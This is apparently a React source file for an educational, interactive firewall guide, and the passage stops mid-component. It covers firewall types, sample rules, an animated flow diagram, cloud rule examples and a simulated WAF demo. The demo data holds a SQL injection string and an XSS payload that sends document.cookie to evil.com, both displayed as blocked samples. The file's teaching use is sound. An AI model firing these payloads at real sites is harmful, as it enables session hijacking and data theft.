"use client";
import { useState, useEffect, useRef } from "react";

/* ─── Keyframe animations injected as a <style> tag ─── */
const ANIM_STYLES = `
@keyframes packetFlow {
  0%   { transform: translateX(0); opacity: 1; }
  80%  { opacity: 1; }
  100% { transform: translateX(var(--travel)); opacity: 0; }
}
@keyframes packetFlowDown {
  0%   { transform: translateY(0); opacity: 1; }
  80%  { opacity: 1; }
  100% { transform: translateY(var(--travel-y)); opacity: 0; }
}
@keyframes shieldPulse {
  0%, 100% { transform: scale(1); filter: drop-shadow(0 0 6px var(--primary)); }
  50%       { transform: scale(1.08); filter: drop-shadow(0 0 20px var(--primary)); }
}
@keyframes shieldGlow {
  0%, 100% { box-shadow: 0 0 10px var(--primary-glow), 0 0 20px var(--primary-glow); }
  50%       { box-shadow: 0 0 25px var(--primary-glow), 0 0 50px var(--primary-glow), 0 0 80px var(--primary-glow); }
}
@keyframes blink {
  0%, 100% { opacity: 1; }
  50%       { opacity: 0.3; }
}
@keyframes fadeInUp {
  from { opacity: 0; transform: translateY(20px); }
  to   { opacity: 1; transform: translateY(0); }
}
@keyframes slideInRight {
  from { opacity: 0; transform: translateX(30px); }
  to   { opacity: 1; transform: translateX(0); }
}
@keyframes ripple {
  0%   { transform: scale(0.8); opacity: 1; }
  100% { transform: scale(2.4); opacity: 0; }
}
@keyframes dash {
  to { stroke-dashoffset: -24; }
}
@keyframes packetDot {
  0%   { offset-distance: 0%;   opacity: 0; }
  10%  { opacity: 1; }
  90%  { opacity: 1; }
  100% { offset-distance: 100%; opacity: 0; }
}
@keyframes allowPulse {
  0%, 100% { box-shadow: 0 0 0 0 rgba(16,185,129,0.5); }
  50%       { box-shadow: 0 0 0 12px rgba(16,185,129,0); }
}
@keyframes denyFlash {
  0%, 100% { background: var(--danger); }
  50%       { background: #ff000080; }
}
@keyframes spinSlow {
  from { transform: rotate(0deg); }
  to   { transform: rotate(360deg); }
}
@keyframes wafScan {
  0%   { width: 0%; }
  100% { width: 100%; }
}
@keyframes resultSlide {
  from { opacity: 0; transform: translateY(-12px) scale(0.95); }
  to   { opacity: 1; transform: translateY(0) scale(1); }
}
`;

/* ─── Data ─── */
const FIREWALL_TYPES = [
  {
    icon: "🔍",
    name: "Packet Filtering Firewall",
    layer: "OSI Layer 3/4",
    color: "var(--primary)",
    desc: "Inspects individual packets at the network and transport layers. Examines IP headers, source/destination addresses, and port numbers. Fast but stateless — cannot detect split-packet attacks.",
    pros: ["Very fast throughput", "Low latency", "Minimal resource usage"],
    cons: ["No session awareness", "Vulnerable to IP spoofing", "Cannot inspect payload"],
    example: "iptables -A INPUT -p tcp --dport 443 -j ACCEPT",
  },
  {
    icon: "🔗",
    name: "Stateful Inspection Firewall",
    layer: "OSI Layer 4",
    color: "var(--secondary)",
    desc: "Tracks the state of active connections using a state table. Understands TCP handshakes, UDP sessions, and ICMP flows. Drops packets that don't match a known connection state.",
    pros: ["Session-aware filtering", "Better security than packet filtering", "Blocks most spoofing attacks"],
    cons: ["Higher memory usage", "State table exhaustion (DoS risk)", "No application awareness"],
    example: "conntrack -L (Linux connection tracking)",
  },
  {
    icon: "🧠",
    name: "Application Layer / NGFW",
    layer: "OSI Layer 7",
    color: "var(--accent)",
    desc: "Next-Generation Firewalls perform deep packet inspection (DPI), application identification, user identity awareness, and SSL/TLS inspection. Understands application protocols beyond port numbers.",
    pros: ["App-aware filtering", "User identity policies", "Intrusion Prevention (IPS)"],
    cons: ["High CPU/memory cost", "TLS decryption complexity", "Complex configuration"],
    example: "Palo Alto NGFW, Cisco Firepower, Fortinet FortiGate",
  },
  {
    icon: "🌐",
    name: "Web Application Firewall (WAF)",
    layer: "OSI Layer 7 — HTTP/HTTPS",
    color: "var(--warning)",
    desc: "Purpose-built to protect web applications from OWASP Top 10 attacks. Inspects HTTP headers, request bodies, URLs, and cookies. Runs rule sets like OWASP CRS (Core Rule Set).",
    pros: ["Blocks SQLi, XSS, CSRF", "Virtual patching", "Rate limiting & bot protection"],
    cons: ["False positives in tuning phase", "Cannot fix code vulnerabilities", "Regex bypass possible"],
    example: "AWS WAF, Cloudflare WAF, ModSecurity, NGINX ModSec",
  },
  {
    icon: "☁️",
    name: "Cloud Firewall (FWaaS)",
    layer: "Network + Application",
    color: "#06b6d4",
    desc: "Firewall-as-a-Service deployed in the cloud. Includes AWS Security Groups & NACLs, Azure NSG, GCP VPC Firewall Rules. Scales automatically with infrastructure.",
    pros: ["Scales with cloud resources", "No hardware to manage", "API-driven automation"],
    cons: ["Cloud-vendor lock-in", "Egress costs", "Shared responsibility confusion"],
    example: "AWS SG: port 443 from 0.0.0.0/0, port 22 from VPN CIDR",
  },
  {
    icon: "💻",
    name: "Host-Based Firewall",
    layer: "Host OS Level",
    color: "var(--success)",
    desc: "Runs directly on the endpoint/server OS. Provides granular per-process control. Critical for lateral movement prevention even inside a trusted network perimeter.",
    pros: ["Per-process filtering", "Last line of defense", "Works inside perimeter"],
    cons: ["Managed per-host (scaling)", "Can be disabled by malware", "High management overhead"],
    example: "iptables/nftables (Linux), Windows Defender Firewall",
  },
];

const FIREWALL_RULES = [
  { id: 1, direction: "Inbound", protocol: "TCP", source: "0.0.0.0/0", destination: "Web Server", port: "443", action: "ALLOW", severity: "low", note: "Public HTTPS traffic" },
  { id: 2, direction: "Inbound", protocol: "TCP", source: "0.0.0.0/0", destination: "Web Server", port: "80", action: "ALLOW", severity: "low", note: "Redirect to HTTPS" },
  { id: 3, direction: "Inbound", protocol: "TCP", source: "10.0.10.0/24 (VPN)", destination: "Bastion Host", port: "22", action: "ALLOW", severity: "medium", note: "SSH from VPN only" },
  { id: 4, direction: "Inbound", protocol: "TCP", source: "App Server Subnet", destination: "DB Server", port: "5432", action: "ALLOW", severity: "medium", note: "PostgreSQL from app tier only" },
  { id: 5, direction: "Inbound", protocol: "TCP", source: "185.220.101.0/24", destination: "Any", port: "Any", action: "DENY", severity: "critical", note: "Known Tor exit node range" },
  { id: 6, direction: "Inbound", protocol: "Any", source: "0.0.0.0/0", destination: "DB Server", port: "3306", action: "DENY", severity: "high", note: "Block direct DB access from internet" },
  { id: 7, direction: "Outbound", protocol: "TCP", source: "App Server", destination: "0.0.0.0/0", port: "80,443", action: "ALLOW", severity: "low", note: "App server can fetch external APIs" },
  { id: 8, direction: "Inbound", protocol: "Any", source: "0.0.0.0/0", destination: "Any", port: "Any", action: "DENY", severity: "critical", note: "Default deny — catch-all last rule" },
];

const WAF_DEMOS = [
  {
    id: "sqli",
    label: "Send SQL Injection",
    icon: "💉",
    request: "GET /users?id=1' OR '1'='1' --",
    attack: "SQL Injection",
    body: "id=1' OR '1'='1' --",
    rule: "OWASP CRS Rule 942100 — SQL Injection via libinjection",
    result: "BLOCK",
    code: "403 Forbidden",
    detail: "Detected UNION/OR-based SQL injection pattern in query parameter. Request dropped before reaching application server.",
    color: "var(--danger)",
  },
  {
    id: "xss",
    label: "Send XSS Payload",
    icon: "📜",
    request: "GET /search?q=<script>fetch('https://evil.com/?c='+document.cookie)</script>",
    attack: "Cross-Site Scripting (XSS)",
    body: "q=<script>fetch('https://evil.com/?c='+document.cookie)</script>",
    rule: "OWASP CRS Rule 941100 — XSS Attack via libinjection",
    result: "BLOCK",
    code: "403 Forbidden",
    detail: "HTML script tag injection detected in URL parameter. WAF pattern matched <script> with event handler and external domain exfiltration.",
    color: "var(--warning)",
  },
  {
    id: "normal",
    label: "Send Normal Request",
    icon: "✅",
    request: "GET /api/products?category=electronics&page=1",
    attack: "Legitimate Request",
    body: "category=electronics&page=1",
    rule: "No rules triggered — all checks passed",
    result: "ALLOW",
    code: "200 OK",
    detail: "Request passed all WAF inspection layers: header validation, URL decode check, parameter sanitization, rate limiting. Forwarded to origin server.",
    color: "var(--success)",
  },
];

const BEST_PRACTICES = [
  { icon: "🚫", title: "Default Deny All", desc: "Start with an implicit deny-all rule. Explicitly whitelist only what is needed. Never use default-allow.", priority: "critical" },
  { icon: "🔒", title: "Principle of Least Privilege", desc: "Open only the minimum ports and protocols required. Use specific source CIDRs instead of 0.0.0.0/0 wherever possible.", priority: "critical" },
  { icon: "🏗️", title: "Network Segmentation (DMZ)", desc: "Separate networks into tiers: DMZ (public-facing), App tier, DB tier. Enforce firewall rules between each tier.", priority: "high" },
  { icon: "📝", title: "Enable Logging on All Rules", desc: "Log every ALLOW and DENY hit with timestamp, source IP, destination, protocol, and bytes. Forward to SIEM.", priority: "high" },
  { icon: "🔍", title: "Regular Rule Audits", desc: "Review all firewall rules quarterly. Remove stale rules from deprecated services, old IPs, or former employees.", priority: "high" },
  { icon: "🌐", title: "Egress Filtering", desc: "Don't only filter inbound. Block outbound to known malicious IPs/domains. Prevent C2 callbacks and data exfiltration.", priority: "high" },
  { icon: "🔄", title: "Automate Rule Management", desc: "Use Infrastructure as Code (Terraform, CloudFormation) to manage firewall rules. Avoid manual console changes.", priority: "medium" },
  { icon: "🛡️", title: "Layer Defenses (Defense in Depth)", desc: "Combine network firewall + WAF + host-based firewall + IDS/IPS. No single layer should be the only protection.", priority: "medium" },
  { icon: "⚡", title: "Rate Limiting & DDoS Protection", desc: "Add rate limiting rules (requests/min per IP). Use upstream DDoS scrubbing (Cloudflare, AWS Shield) before traffic hits your firewall.", priority: "medium" },
  { icon: "🔐", title: "TLS Inspection for NGFW", desc: "Enable SSL/TLS inspection on NGFW to see inside encrypted traffic. Use a trusted internal CA to re-sign certificates.", priority: "medium" },
];

const AWS_SG_EXAMPLE = `# AWS Security Group — Web Server (Public-Facing)
resource "aws_security_group" "web_server" {
  name        = "web-server-sg"
  description = "Security group for public web server"
  vpc_id      = aws_vpc.main.id

  # Inbound Rules
  ingress {
    description = "HTTPS from internet"
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  ingress {
    description = "HTTP redirect only"
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  ingress {
    description = "SSH from VPN CIDR only"
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["10.10.0.0/16"]  # VPN subnet
  }

  # Outbound Rules (default allow-all — restrict per policy)
  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

# AWS Security Group — Database Tier (Private)
resource "aws_security_group" "db_server" {
  name        = "db-server-sg"
  description = "Database tier — no internet access"
  vpc_id      = aws_vpc.main.id

  ingress {
    description     = "PostgreSQL from App Tier only"
    from_port       = 5432
    to_port         = 5432
    protocol        = "tcp"
    security_groups = [aws_security_group.app_server.id]
  }

  # NO egress to internet — isolated subnet
}

# Azure NSG equivalent rule
az network nsg rule create \\
  --resource-group myRG \\
  --nsg-name myNSG \\
  --name AllowHTTPS \\
  --priority 100 \\
  --direction Inbound \\
  --access Allow \\
  --protocol Tcp \\
  --destination-port-ranges 443 \\
  --source-address-prefixes '*'`;

/* ─── Sub-components ─── */

function TypeCard({ fw }: { fw: typeof FIREWALL_TYPES[0] }) {
  const [open, setOpen] = useState(false);
  return (
    <div
      className="card anim-fadeup"
      style={{ borderTop: `3px solid ${fw.color}`, cursor: "pointer", transition: "box-shadow 0.2s" }}
      onClick={() => setOpen((p) => !p)}
    >
      <div style={{ display: "flex", alignItems: "flex-start", gap: 12 }}>
        <div style={{ fontSize: "2rem", lineHeight: 1 }}>{fw.icon}</div>
        <div style={{ flex: 1 }}>
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8, flexWrap: "wrap" }}>
            <h3 style={{ fontSize: "0.97rem", fontWeight: 700, marginBottom: 2 }}>{fw.name}</h3>
            <span style={{ fontSize: "0.68rem", padding: "2px 8px", borderRadius: 6, background: `${fw.color}18`, color: fw.color, border: `1px solid ${fw.color}40`, whiteSpace: "nowrap" }}>{fw.layer}</span>
          </div>
          <p style={{ fontSize: "0.82rem", color: "var(--muted)", lineHeight: 1.55 }}>{fw.desc}</p>
        </div>
        <span style={{ color: "var(--muted)", fontSize: "1rem", transition: "transform 0.2s", transform: open ? "rotate(180deg)" : "none", flexShrink: 0 }}>▾</span>
      </div>
      {open && (
        <div style={{ marginTop: "1rem", borderTop: "1px solid var(--card-border)", paddingTop: "1rem", animation: "fadeInUp 0.2s ease" }}>
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "1rem", marginBottom: "0.75rem" }}>
            <div>
              <div style={{ fontSize: "0.75rem", fontWeight: 700, color: "var(--success)", marginBottom: 6 }}>PROS</div>
              {fw.pros.map((p, i) => (
                <div key={i} style={{ display: "flex", gap: 6, alignItems: "flex-start", fontSize: "0.8rem", marginBottom: 4 }}>
                  <span style={{ color: "var(--success)", flexShrink: 0 }}>✓</span> {p}
                </div>
              ))}
            </div>
            <div>
              <div style={{ fontSize: "0.75rem", fontWeight: 700, color: "var(--danger)", marginBottom: 6 }}>CONS</div>
              {fw.cons.map((c, i) => (
                <div key={i} style={{ display: "flex", gap: 6, alignItems: "flex-start", fontSize: "0.8rem", marginBottom: 4 }}>
                  <span style={{ color: "var(--danger)", flexShrink: 0 }}>✗</span> {c}
                </div>
              ))}
            </div>
          </div>
          <div className="code-block" style={{ fontSize: "0.75rem", padding: "0.6rem 0.9rem" }}>
            <span style={{ color: "var(--muted)" }}>Example: </span>{fw.example}
          </div>
        </div>
      )}
    </div>
  );
}

/* ─── Animated Flow Diagram ─── */
function FlowDiagram() {
  const [packetPos, setPacketPos] = useState(0);
  const [phase, setPhase] = useState<"travel" | "decide" | "allow" | "deny">("travel");
  const [tick, setTick] = useState(0);

  useEffect(() => {
    const PHASES: Array<"travel" | "decide" | "allow" | "deny"> = ["travel", "decide", "allow", "deny"];
    let step = 0;
    const DURATIONS = [1800, 1000, 1600, 1600];
    let timer: ReturnType<typeof setTimeout>;
    function next() {
      step = (step + 1) % PHASES.length;
      setPhase(PHASES[step]);
      setTick((t) => t + 1);
      timer = setTimeout(next, DURATIONS[step]);
    }
    timer = setTimeout(next, DURATIONS[0]);
    return () => clearTimeout(timer);
  }, []);

  /* packet x position: 0 = left edge, 1 = firewall, 2 = destination */
  useEffect(() => {
    if (phase === "travel") setPacketPos(0);
    else if (phase === "decide") setPacketPos(1);
    else setPacketPos(2);
  }, [phase]);

  const isAllow = phase === "allow";
  const isDeny = phase === "deny";
  const isDecide = phase === "decide";
  const isTravel = phase === "travel";

  /* node positions in % for the SVG-style layout */
  return (
    <div style={{ position: "relative", minHeight: 340, background: "linear-gradient(135deg, var(--muted-bg) 0%, var(--card) 100%)", borderRadius: 16, border: "1px solid var(--card-border)", padding: "1.5rem", overflow: "hidden" }}>
      {/* Background grid */}
      <div style={{ position: "absolute", inset: 0, backgroundImage: "radial-gradient(circle, var(--card-border) 1px, transparent 1px)", backgroundSize: "28px 28px", opacity: 0.4, pointerEvents: "none" }} />

      {/* Glow blobs */}
      <div style={{ position: "absolute", top: "20%", left: "48%", width: 120, height: 120, borderRadius: "50%", background: "var(--primary-glow)", filter: "blur(40px)", pointerEvents: "none", animation: "shieldGlow 3s ease-in-out infinite" }} />

      <div style={{ position: "relative", display: "flex", alignItems: "center", justifyContent: "space-between", gap: "0.5rem", flexWrap: "nowrap" }}>

        {/* INTERNET NODE */}
        <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: 8, minWidth: 80 }}>
          <div style={{ width: 64, height: 64, borderRadius: "50%", background: "linear-gradient(135deg, #1e3a5f, #0f172a)", border: "2px solid var(--primary)", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "1.6rem", boxShadow: "0 4px 20px rgba(0,0,0,0.4)" }}>
            🌐
          </div>
          <span style={{ fontSize: "0.72rem", fontWeight: 700, color: "var(--muted)", textAlign: "center" }}>Internet</span>
          <div style={{ fontSize: "0.62rem", color: "var(--muted)", textAlign: "center" }}>Untrusted</div>
        </div>

        {/* ARROW + PACKET from Internet to Firewall */}
        <div style={{ flex: 1, position: "relative", display: "flex", alignItems: "center", minWidth: 60 }}>
          {/* Arrow line */}
          <div style={{ width: "100%", height: 3, background: "linear-gradient(90deg, var(--primary)40, var(--primary))", borderRadius: 2, position: "relative" }}>
            {/* Animated dashes */}
            <div style={{ position: "absolute", inset: 0, background: "repeating-linear-gradient(90deg, transparent, transparent 6px, var(--primary) 6px, var(--primary) 12px)", borderRadius: 2, opacity: 0.5, animation: isTravel ? "none" : undefined }} />
          </div>
          {/* Moving packet dot */}
          {isTravel && (
            <div style={{
              position: "absolute",
              left: `${packetPos * 0}%`,
              width: 14, height: 14, borderRadius: "50%",
              background: "var(--warning)",
              boxShadow: "0 0 10px var(--warning)",
              animation: "packetFlow 1.6s ease-in-out forwards",
              "--travel": "calc(100% + 14px)",
            } as React.CSSProperties} />
          )}
          <div style={{ position: "absolute", right: -6, top: "50%", transform: "translateY(-50%)", borderLeft: "8px solid var(--primary)", borderTop: "5px solid transparent", borderBottom: "5px solid transparent" }} />
        </div>

        {/* FIREWALL NODE */}
        <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: 8, minWidth: 90, zIndex: 2 }}>
          <div style={{
            width: 74, height: 74, borderRadius: 16,
            background: isDecide
              ? "linear-gradient(135deg, #1e3a8a, #2563eb)"
              : isAllow
              ? "linear-gradient(135deg, #064e3b, #059669)"
              : isDeny
              ? "linear-gradient(135deg, #7f1d1d, #dc2626)"
              : "linear-gradient(135deg, #1e3a8a, #2563eb)",
            border: `2px solid ${isDecide ? "var(--primary)" : isAllow ? "var(--success)" : isDeny ? "var(--danger)" : "var(--primary)"}`,
            display: "flex", alignItems: "center", justifyContent: "center", fontSize: "1.8rem",
            boxShadow: isDecide ? "0 0 24px var(--primary)" : isAllow ? "0 0 24px var(--success)" : isDeny ? "0 0 24px var(--danger)" : "none",
            animation: "shieldPulse 2.5s ease-in-out infinite",
            transition: "all 0.4s ease",
          }}>
            🛡️
          </div>
          <span style={{ fontSize: "0.72rem", fontWeight: 700, color: "var(--fg)", textAlign: "center" }}>Firewall</span>
          <div style={{
            fontSize: "0.62rem", fontWeight: 600, textAlign: "center", padding: "2px 8px", borderRadius: 6,
            background: isDecide ? "var(--primary-glow)" : isAllow ? "rgba(16,185,129,0.15)" : isDeny ? "rgba(239,68,68,0.15)" : "var(--muted-bg)",
            color: isDecide ? "var(--primary)" : isAllow ? "var(--success)" : isDeny ? "var(--danger)" : "var(--muted)",
            border: `1px solid ${isDecide ? "var(--primary)" : isAllow ? "var(--success)" : isDeny ? "var(--danger)" : "var(--card-border)"}`,
            transition: "all 0.4s ease",
            animation: isDecide ? "blink 0.8s ease-in-out infinite" : "none",
          }}>
            {isTravel ? "Waiting" : isDecide ? "Inspecting..." : isAllow ? "ALLOW ✓" : "DENY ✗"}
          </div>
          <div style={{ fontSize: "0.6rem", color: "var(--muted)", textAlign: "center" }}>Rule Engine</div>
        </div>

        {/* ARROW out from firewall — splits to allow/deny */}
        <div style={{ flex: 1, position: "relative", display: "flex", flexDirection: "column", alignItems: "center", minWidth: 60 }}>
          {/* ALLOW path (top) */}
          <div style={{ width: "100%", position: "relative", marginBottom: 4 }}>
            <div style={{ width: "100%", height: 3, background: isAllow ? "var(--success)" : "var(--card-border)", borderRadius: 2, transition: "background 0.4s ease", boxShadow: isAllow ? "0 0 8px var(--success)" : "none" }} />
            {isAllow && (
              <div style={{ position: "absolute", left: 0, width: 14, height: 14, borderRadius: "50%", background: "var(--success)", boxShadow: "0 0 10px var(--success)", top: "50%", transform: "translateY(-50%)", animation: "packetFlow 1.4s ease-in-out forwards", "--travel": "100%" } as React.CSSProperties} />
            )}
            <div style={{ position: "absolute", right: -6, top: "50%", transform: "translateY(-50%)", borderLeft: "8px solid " + (isAllow ? "var(--success)" : "var(--card-border)"), borderTop: "5px solid transparent", borderBottom: "5px solid transparent", transition: "border-color 0.4s ease" }} />
          </div>
          <div style={{ fontSize: "0.65rem", fontWeight: 700, color: isAllow ? "var(--success)" : "var(--card-border)", transition: "color 0.4s ease" }}>ALLOW</div>

          {/* DENY path (bottom) */}
          <div style={{ width: "100%", position: "relative", marginTop: 4 }}>
            <div style={{ width: "100%", height: 3, background: isDeny ? "var(--danger)" : "var(--card-border)", borderRadius: 2, transition: "background 0.4s ease", boxShadow: isDeny ? "0 0 8px var(--danger)" : "none" }} />
            <div style={{ position: "absolute", right: -6, top: "50%", transform: "translateY(-50%)", borderLeft: "8px solid " + (isDeny ? "var(--danger)" : "var(--card-border)"), borderTop: "5px solid transparent", borderBottom: "5px solid transparent", transition: "border-color 0.4s ease" }} />
          </div>
          <div style={{ fontSize: "0.65rem", fontWeight: 700, color: isDeny ? "var(--danger)" : "var(--card-border)", transition: "color 0.4s ease" }}>DENY</div>
        </div>

        {/* DESTINATIONS */}
        <div style={{ display: "flex", flexDirection: "column", gap: 6, minWidth: 110 }}>
          {/* Allow destination: Internal Network */}
          <div style={{
            borderRadius: 10, border: `2px solid ${isAllow ? "var(--success)" : "var(--card-border)"}`,
            background: isAllow ? "rgba(16,185,129,0.1)" : "var(--card)",
            padding: "6px 10px", transition: "all 0.4s ease",
            boxShadow: isAllow ? "0 0 16px rgba(16,185,129,0.3)" : "none",
            animation: isAllow ? "allowPulse 1.4s ease-in-out infinite" : "none",
          }}>
            <div style={{ fontSize: "0.78rem", fontWeight: 700, color: isAllow ? "var(--success)" : "var(--muted)", display: "flex", alignItems: "center", gap: 4 }}>
              🖥️ <span>App Server</span>
            </div>
            <div style={{ fontSize: "0.62rem", color: "var(--muted)" }}>Internal Network</div>
          </div>

          {/* Deny destination: Dropped + Logged */}
          <div style={{
            borderRadius: 10, border: `2px solid ${isDeny ? "var(--danger)" : "var(--card-border)"}`,
            background: isDeny ? "rgba(239,68,68,0.1)" : "var(--card)",
            padding: "6px 10px", transition: "all 0.4s ease",
            boxShadow: isDeny ? "0 0 16px rgba(239,68,68,0.3)" : "none",
          }}>
            <div style={{ fontSize: "0.78rem", fontWeight: 700, color: isDeny ? "var(--danger)" : "var(--muted)", display: "flex", alignItems: "center", gap: 4 }}>
              🚫 <span>Dropped</span>
            </div>
            <div style={{ fontSize: "0.62rem", color: "var(--muted)" }}>Logged + Alert</div>
          </div>
        </div>

      </div>

      {/* Status bar */}
      <div style={{ marginTop: "1.25rem", display: "flex", alignItems: "center", justifyContent: "center", gap: 12, flexWrap: "wrap" }}>
        {[
          { label: "Packet Arrives", active: isTravel, color: "var(--warning)" },
          { label: "Rule Inspection", active: isDecide, color: "var(--primary)" },
          { label: "Decision: ALLOW", active: isAllow, color: "var(--success)" },
          { label: "Decision: DENY", active: isDeny, color: "var(--danger)" },
        ].map((s) => (
          <div key={s.label} style={{ display: "flex", alignItems: "center", gap: 6, fontSize: "0.73rem" }}>
            <div style={{ width: 8, height: 8, borderRadius: "50%", background: s.active ? s.color : "var(--card-border)", boxShadow: s.active ? `0 0 8px ${s.color}` : "none", transition: "all 0.3s ease" }} />
            <span style={{ color: s.active ? s.color : "var(--muted)", fontWeight: s.active ? 700 : 400, transition: "color 0.3s ease" }}>{s.label}</span>
          </div>
        ))}
      </div>
    </div>
  );
}

/* ─── WAF Interactive Demo ─── */
function WAFDemo() {
  const [active, setActive] = useState<string | null>(null);
  const [scanning, setScanning] = useState(false);
  const [result, setResult] = useState<typeof WAF_DEMOS[0] | null>(null);

  function runDemo(demo: typeof WAF_DEMOS[0]) {
    if (scanning) return;
    setActive(demo.id);
    setResult(null);
    setScanning(true);
    setTimeout(() => {
      setScanning(false);
      setResult(demo);
    }, 1400);
  }

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: "1.25rem" }}>
      {/* Request buttons */}
      <div style={{ display: "flex", gap: 10, flexWrap: "wrap" }}>
        {WAF_DEMOS.map((demo) => (
          <button key={demo.id} onClick={() => runDemo(demo)}
            disabled={scanning}
            style={{
              padding: "10px 18px", borderRadius: 10, border: `1.5px solid ${active === demo.id ? demo.color : "var(--card-border)"}`,
              background: active === demo.id ? `${demo.color}18` : "var(--card)",
              color: active === demo.id ? demo.color : "var(--fg)",
              fontWeight: 600, fontSize: "0.85rem", cursor: scanning ? "not-allowed" : "pointer",
              display: "flex", alignItems: "center", gap: 7, transition: "all 0.2s ease",
              opacity: scanning && active !== demo.id ? 0.5 : 1,
            }}>
            {demo.icon} {demo.label}
          </button>
        ))}
      </div>

      {/* HTTP request display */}
      {active && (
        <div className="code-block" style={{ fontSize: "0.78rem", animation: "slideInRight 0.25s ease" }}>
          <div style={{ color: "var(--muted)", marginBottom: 4, fontSize: "0.7rem", fontWeight: 600 }}>HTTP REQUEST</div>
          <div style={{ color: "var(--accent)" }}>{WAF_DEMOS.find((d) => d.id === active)?.request}</div>
          <div style={{ color: "var(--muted)", marginTop: 6, fontSize: "0.68rem" }}>Host: api.example.com</div>
          <div style={{ color: "var(--muted)", fontSize: "0.68rem" }}>User-Agent: Mozilla/5.0</div>
        </div>
      )}

      {/* WAF scanning animation */}
      {scanning && (
        <div className="card" style={{ padding: "1rem", border: "1px solid var(--primary)", background: "var(--primary-glow)" }}>
          <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 8 }}>
            <div style={{ fontSize: "1.2rem", animation: "spinSlow 1s linear infinite" }}>⚙️</div>
            <span style={{ fontSize: "0.85rem", fontWeight: 700, color: "var(--primary)" }}>WAF Inspecting Request...</span>
          </div>
          <div className="progress-bar">
            <div className="progress-fill" style={{ width: "100%", background: "var(--primary)", animation: "wafScan 1.3s ease-out forwards" }} />
          </div>
          <div style={{ fontSize: "0.72rem", color: "var(--muted)", marginTop: 8, display: "flex", gap: 16, flexWrap: "wrap" }}>
            <span>✓ Header validation</span>
            <span>✓ URL decode</span>
            <span style={{ animation: "blink 0.6s infinite" }}>⟳ Pattern matching...</span>
          </div>
        </div>
      )}

      {/* Result */}
      {result && !scanning && (
        <div className="card" style={{
          border: `2px solid ${result.color}`,
          background: `${result.color}0d`,
          animation: "resultSlide 0.3s ease",
        }}>
          <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", flexWrap: "wrap", gap: 8, marginBottom: "0.75rem" }}>
            <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
              <div style={{
                fontSize: "1.8rem", width: 52, height: 52, borderRadius: "50%",
                background: `${result.color}20`, border: `2px solid ${result.color}`,
                display: "flex", alignItems: "center", justifyContent: "center",
              }}>
                {result.result === "BLOCK" ? "🚫" : "✅"}
              </div>
              <div>
                <div style={{ fontSize: "1.1rem", fontWeight: 900, color: result.color }}>{result.result === "BLOCK" ? "BLOCKED" : "ALLOWED"}</div>
                <div style={{ fontSize: "0.8rem", color: "var(--muted)" }}>{result.attack}</div>
              </div>
            </div>
            <div style={{ padding: "6px 14px", borderRadius: 8, background: `${result.color}20`, border: `1px solid ${result.color}`, fontSize: "0.9rem", fontWeight: 800, color: result.color }}>
              {result.code}
            </div>
          </div>

          <div style={{ fontSize: "0.78rem", color: "var(--muted)", marginBottom: 8, fontStyle: "italic" }}>
            Rule: <span style={{ color: "var(--fg)", fontStyle: "normal", fontWeight: 600 }}>{result.rule}</span>
          </div>

          <div className="code-block" style={{ fontSize: "0.75rem" }}>
            <div style={{ color: "var(--muted)", marginBottom: 4, fontSize: "0.68rem", fontWeight: 600 }}>WAF LOG ENTRY</div>
            <div style={{ color: result.result === "BLOCK" ? "var(--danger)" : "var(--success)" }}>
              [{new Date().toISOString()}] {result.result === "BLOCK" ? "BLOCKED" : "ALLOWED"} — {result.attack}
            </div>
            <div style={{ color: "var(--muted)", marginTop: 2 }}>Detail: {result.detail}</div>
          </div>
        </div>
      )}

      {!active && (
        <div style={{ textAlign: "center", padding: "2rem", color: "var(--muted)", fontSize: "0.85rem", border: "2px dashed var(--card-border)", borderRadius: 12 }}>
          Click one of the buttons above to simulate a WAF inspection
        </div>
      )}
    </div>
  );
}

/* ─── Main Page ─── */
export default function FirewallPage() {
  const [mounted, setMounted] = useState(false);
  useEffect(() => { setTimeout(() => setMounted(true), 80); }, []);

  return (
    <div style={{ maxWidth: 1100, margin: "0 auto", opacity: mounted ? 1 : 0, transition: "opacity 0.4s ease" }}>
      <style>{ANIM_STYLES}</style>

      {/* ═══ HERO ═══ */}
      <div className="anim-fadeup" style={{ marginBottom: "2rem" }}>
        <div style={{ background: "linear-gradient(135deg, var(--card) 0%, var(--muted-bg) 100%)", border: "1px solid var(--card-border)", borderRadius: 16, padding: "2rem", position: "relative", overflow: "hidden" }}>
          <div style={{ position: "absolute", top: -50, right: -50, width: 220, height: 220, borderRadius: "50%", background: "var(--primary-glow)", filter: "blur(70px)", pointerEvents: "none" }} />
          <div style={{ position: "absolute", bottom: -30, left: "25%", width: 160, height: 160, borderRadius: "50%", background: "rgba(139,92,246,0.12)", filter: "blur(55px)", pointerEvents: "none" }} />
          <div style={{ position: "relative" }}>
            <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: "0.75rem", flexWrap: "wrap" }}>
              <span style={{ fontSize: "2.4rem" }}>🛡️</span>
              <span className="badge badge-critical" style={{ fontSize: "0.72rem" }}>Network Security</span>
              <span style={{ padding: "2px 10px", borderRadius: 6, background: "rgba(6,182,212,0.12)", color: "var(--accent)", border: "1px solid rgba(6,182,212,0.3)", fontSize: "0.72rem", fontWeight: 600 }}>Interactive</span>
            </div>
            <h1 style={{ fontSize: "2rem", fontWeight: 900, marginBottom: "0.5rem", lineHeight: 1.2 }}>
              <span className="gradient-text">Firewall</span> — Deep Dive
            </h1>
            <p style={{ color: "var(--muted)", maxWidth: 700, lineHeight: 1.65, fontSize: "0.95rem" }}>
              A comprehensive guide to firewalls: types, architectures, animated flow diagrams, WAF demos, cloud rules, and best practices. Essential knowledge for every security engineer.
            </p>
            <div style={{ display: "flex", gap: 10, marginTop: "1rem", flexWrap: "wrap" }}>
